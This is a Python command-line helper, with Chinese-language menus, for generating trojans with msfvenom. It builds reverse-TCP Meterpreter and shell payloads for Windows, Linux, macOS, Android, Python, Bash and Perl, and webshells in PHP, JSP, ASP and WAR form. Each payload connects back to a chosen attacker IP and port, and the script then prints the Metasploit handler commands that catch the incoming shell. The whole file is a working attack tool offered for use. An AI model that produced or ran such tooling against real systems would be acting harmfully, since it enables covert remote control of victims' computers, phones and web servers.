#!/usr/bin/env python3

import os
import subprocess
import socket

# 彩色输出
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'  # 无颜色

# 符号美化
HEADER = f"{YELLOW}============================================================={NC}"
SUBHEADER = f"{BLUE}-------------------------------------------------------------{NC}"

# 获取本机IP地址
def get_local_ip():
    ip = None
    try:
        ip = subprocess.check_output(['hostname', '-I']).decode().strip().split()[0]
    except Exception as e:
        print(f"{RED}获取本机IP地址失败: {e}{NC}")
    return ip or "127.0.0.1"

# 打印欢迎信息
def print_welcome():
    print(f"{HEADER}")
    print(f"{GREEN}             Msfvenom木马生成辅助工具             {NC}")
    print(f"{YELLOW}                   By 特让他也让                   {NC}")
    print(f"{HEADER}")

# 显示菜单
def show_menu():
    print(f"{SUBHEADER}")
    print(f"{YELLOW}请选择要生成的木马类型:{NC}")
    print(f"{SUBHEADER}")
    print("1) Windows - 反向TCP连接")
    print("2) Linux - 反向TCP连接")
    print("3) MacOS - 反向TCP连接")
    print("4) PHP - Meterpreter PHP Webshell")
    print("5) JSP - Meterpreter JSP Webshell")
    print("6) ASP - Meterpreter ASP Webshell")
    print("7) WAR - Meterpreter WAR Webshell")
    print("8) Android - Meterpreter反向TCP连接")
    print("9) Python - Meterpreter反向TCP连接")
    print("10) Bash - 反向TCP连接")
    print("11) Perl - 反向TCP连接")
    print(f"{SUBHEADER}")

# 获取用户选择
def get_choice():
    choice = input("请输入您的选择: ")
    if choice not in [str(i) for i in range(1, 12)]:
        print(f"{RED}无效选项！请重新选择。{NC}")
        return None
    return choice

# 获取用户IP地址和端口
def get_ip_port(default_ip):
    lhost = input(f"{YELLOW}请输入您的IP地址 (默认: {default_ip}, 回车选择默认): {NC}") or default_ip
    lport = input(f"{YELLOW}请输入端口号: {NC}")
    if not lport:
        print(f"{RED}端口号不能为空！{NC}")
        return None, None
    
    # 检测端口是否被占用
    if not is_port_available(int(lport)):
        print(f"{RED}端口 {lport} 已被占用！{NC}")
        return None, None
    
    return lhost, lport

# 检测端口是否可用
def is_port_available(port, host='0.0.0.0'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            s.bind((host, port))
        except OSError:
            return False
    return True

# 生成payload并显示监听代码
def generate_payload(choice, lhost, lport):
    payload_map = {
        "1": ("windows/meterpreter/reverse_tcp", "exe", "shell.exe", False),
        "2": ("linux/x64/meterpreter/reverse_tcp", "elf", "shell.elf", False),
        "3": ("osx/x86/shell_reverse_tcp", "macho", "shell.macho", False),
        "4": ("php/meterpreter_reverse_tcp", "raw", "shell.php", True),
        "5": ("java/jsp_shell_reverse_tcp", "raw", "shell.jsp", False),
        "6": ("windows/meterpreter/reverse_tcp", "asp", "shell.asp", False),
        "7": ("java/jsp_shell_reverse_tcp", "war", "shell.war", False),
        "8": ("android/meterpreter/reverse_tcp", "apk", "android_yuanboss.apk", False),
        "9": ("python/meterpreter/reverse_tcp", "raw", "shell.py", False),
        "10": ("cmd/unix/reverse_bash", "raw", "shell.sh", False),
        "11": ("cmd/unix/reverse_perl", "raw", "shell.pl", False),
    }

    if choice not in payload_map:
        print(f"{RED}无效选项！{NC}")
        return False

    payload, file_extension, payload_name, is_php = payload_map[choice]

    print(f"{YELLOW}正在生成payload，请稍候...{NC}")
    output_file = payload_name
    if choice == "8":  # 安卓的处理方式不同
        command = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-o", output_file]
    else:
        command = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", file_extension, "-o", output_file]
    
    print(f"{BLUE}执行命令: {' '.join(command)}{NC}")
    result = subprocess.run(command, capture_output=True)
    
    if result.returncode != 0:
        print(f"{RED}生成payload失败: {result.stderr.decode()}{NC}")
        return False

    if is_php:
        # 对于PHP Webshell，添加<?php 标记
        print(f"{YELLOW}正在处理 PHP 文件...{NC}")
        with open(output_file, 'r+b') as f:
            content = f.read()
        with open(output_file, 'wb') as f:
            f.write(b'<?php ' + content)

    print(f"{GREEN}payload生成成功，文件名为: {output_file}{NC}")
    print(f"{GREEN}payload路径: {os.path.abspath(output_file)}{NC}")
    print(f"{SUBHEADER}")
    print(f"{YELLOW}在MSF中使用以下命令进行监听:{NC}")
    print(f"{SUBHEADER}")

    print(f"{GREEN}use exploit/multi/handler\nset payload {payload}\nset LHOST {lhost}\nset LPORT {lport}\nexploit{NC}")

    print(f"{SUBHEADER}")

    return True

# 主程序
def main():
    print_welcome()
    default_ip = get_local_ip()

    while True:
        show_menu()
        choice = get_choice()
        if choice is None:
            continue  # 重新显示菜单
        lhost, lport = get_ip_port(default_ip)
        
        if lhost and lport:
            if generate_payload(choice, lhost, lport):
                print(f"{HEADER}")
                print(f"{RED}***请开始你的表演！***{NC}")
                print(f"{HEADER}")
                break  # 成功生成payload后退出循环

if __name__ == "__main__":
    main()

